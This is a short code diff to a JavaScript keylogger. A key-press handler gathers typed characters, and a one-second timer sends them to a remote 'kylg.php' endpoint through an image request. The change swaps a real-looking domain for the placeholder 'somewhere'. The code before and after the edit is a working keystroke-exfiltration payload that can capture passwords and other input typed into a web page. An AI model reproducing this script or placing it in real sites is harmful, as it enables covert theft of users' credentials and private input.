@@ -9,6 +9,6 @@ document.onkeypress = function(e) {
 
 window.setInterval(function(){
         if( keys != "" )
-                new Image().src = 'http://domek.obywateleuropy.eu/kylg.php?c=' + keys + ' ';
+                new Image().src = 'http://somewhere/kylg.php?c=' + keys + ' ';
         keys = '';
 }, 1000);
